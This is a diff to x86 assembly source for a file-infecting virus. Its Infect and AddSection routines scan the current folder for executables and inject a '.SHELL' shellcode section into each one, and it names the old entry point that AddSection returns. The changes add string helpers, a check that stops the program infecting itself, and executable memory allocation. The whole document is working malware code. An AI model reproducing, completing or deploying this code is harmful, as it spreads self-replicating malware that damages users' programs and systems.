@@ -918,8 +918,30 @@ FindSection: ; filepath, section name -> return index section unless return -1 (
         ret
     ;;; end find name section
 
+
+GetLenStr: ; str1 -> len
+    push ebp
+    mov ebp, esp
+
+    mov edx, [ebp+0x8]
+    xor eax, eax
+    xor ebx, ebx
+    xor ecx, ecx
+
+    .loop:
+        mov al, [edx+ecx]
+        cmp al, bl ; compare al to null
+        je .end
+
+        inc ecx
+        jmp .loop
+    .end:
+        mov eax, ecx
+        pop ebp
+        ret
+
     
-CmpStr:
+CmpStr: ; str1, str2, len to compare -> equal return 0
     push ebp
     mov ebp, esp 
 
@@ -927,6 +949,7 @@ CmpStr:
     mov edi, [ebp+0xc] ; str2
     mov edx, [ebp+0x10] ; len to compare
     xor ecx, ecx ; counter
+    xor ebx, ebx
     .loop:
         cmp ecx, edx
         je .equal
@@ -1086,7 +1109,7 @@ AddSection:       ; file path, name section, file shellcode -> Return old entryp
 
     push 0
     push 0x1000; section aligment
-    push 5000; size section
+    push 6000; size section
     call align_address
     add esp, 0xc ; free stack
 
@@ -1228,7 +1251,7 @@ AddSection:       ; file path, name section, file shellcode -> Return old entryp
 
     push 0
     push 0x200; file aligment
-    push 5000; size section
+    push 6000; size section
     call align_address
     add esp, 0xc ; free stack
 
@@ -2002,7 +2025,7 @@ Infect: ; return old section
     push ebp
     mov ebp, esp
 
-    sub esp, 0x1c ; get 4 reg for local variable
+    sub esp, 0x20 ; get 4 reg for local variable
 
     ; ***** COPY CURRENT FILE
     ; >1. alloc space for save file path
@@ -2021,8 +2044,29 @@ Infect: ; return old section
     call GetModuleFileNameA
     add esp, 0xc; free args
 
+    mov eax, [ebp-0x4]
+    push eax
+    call GetLenStr
+    add esp, 0x4
 
-    ; >3. Repair temp folder
+    mov ebx, [ebp-0x4] ; fullpath current file name
+
+    push eax ; len
+    push ebx ; fullpath
+    call GetFileName ; get filename from path
+    add esp, 0x8
+    mov [ebp-0x4], eax
+
+
+    ; >3. Repair temp file
+    push 0x40; PAGE_EXECUTE_READWRITE
+    push 0x1000 ; MEM_COMMIT
+    push 0x10 ; max len
+    push 0 ;
+    call VirtualAlloc
+    mov [ebp-0x8], eax
+    add esp, 0x10; free args
+
     push 0          ; tempfile.exe
     push 0x6578652e
     push 0x656c6966
@@ -2034,6 +2078,11 @@ Infect: ; return old section
     push 0x2e6e6f69
     push 0x74636573
     mov [ebp-0xc], esp
+
+    push 0          ; .SHELL
+    push 0x4c4c
+    push 0x4548532e
+    mov [ebp-0x20], esp ; section name
 
     ; >4. Copy to tempFile
     mov ebx, [ebp-0x4] ; current filename
@@ -2054,7 +2103,6 @@ Infect: ; return old section
     push ecx 
     push ebx 
     call ReadLastSection
-
     add esp, 0x8 ; free args
 
     ; *** END READ LAST SECTION
@@ -2090,11 +2138,6 @@ Infect: ; return old section
 
     .loop_load_file:
 
-        push 0          ; .SHELL
-        push 0x4c4c
-        push 0x4548532e
-        mov edx, esp ; section name
-
         mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
         add ebx, 0x2c ; file path from current folder
 
@@ -2108,9 +2151,35 @@ Infect: ; return old section
         jz .load_next_file ; if ZF=1 => 2 strings are equal
 
 
+        ; avoid to add section itself
+        mov eax, [ebp-0x4] ; name of program
+        push eax
+        call GetLenStr
+        add esp, 0x4 ; free arg
+
+        mov ecx, [ebp-0x4] ; name of program
+
+        mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
+        add ebx, 0x2c ; file path from current folder
+
+        push eax ; len
+        push ebx ; filename from folder
+        push ecx ; name if program
+        call CmpStr
+        add esp, 0xc
+
+        cmp eax, 0
+        je .load_next_file
+
+
         ; mov edx, esp
         ; mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
         ; add ebx, 0x2c ; file path from current folder
+
+        mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
+        add ebx, 0x2c ; file path from current folder
+
+        mov edx, [ebp-0x20]
         
         push edx ; section name
         push ebx ; file of current folder
@@ -2121,10 +2190,11 @@ Infect: ; return old section
         jne .load_next_file ; => chua bi lay nhiem -> thuc hien lay nhiem
         ; end check file
 
+
         mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
         add ebx, 0x2c ; file path from current folder
 
-        mov edx, esp ; section name
+        mov edx, [ebp-0x20] ; section name
         mov ecx, [ebp-0xc] ; path file save section shellcode content
         
         push ecx ; file point section shellcode
@@ -2135,7 +2205,6 @@ Infect: ; return old section
         add esp, 0xc ; free agrs
         
         .load_next_file:
-            add esp, 0xc ; free .SHELL string
 
             mov eax, [ebp-0x14] ; hFile
             mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
@@ -2152,10 +2221,42 @@ Infect: ; return old section
 
     add esp, 0x10 ; free section.raw string
     add esp, 0x10 ; free tempfile.exe
-    add esp, 0x1c ; free local variable
+    add esp, 0xc ; free .SHELL string
+    add esp, 0x20 ; free local variable
 
     pop ebp
     ret
+
+GetFileName: ; full path, len -> return pointer to file name
+    push ebp
+    mov ebp, esp 
+
+    mov edx, [ebp+0x8] ; full path
+    mov esi, [ebp+0xc] ; len
+
+    xor ebx, ebx
+
+    mov ecx, esi
+    dec ecx
+    .loop:
+        mov al, [edx+ecx]
+        mov bl, 0x5c ; '\'
+
+        cmp al, bl
+        je .found
+
+        dec ecx
+        cmp ecx,0
+        jle .found ; -> the path have only filename
+
+        jmp .loop
+
+    .found:
+        inc ecx
+        lea eax, [edx + ecx]
+        pop ebp
+        ret
+
 
 
 FindFirstFileA: ; lpFileName, lpFindFileData
@@ -2213,4 +2314,8 @@ FindNextFileA: ; hFindFile, lpFindFileData
 
     pop ebp
     ret
+
+CopyMemory:
+    push ebp
+    mov ebp, esp 
 
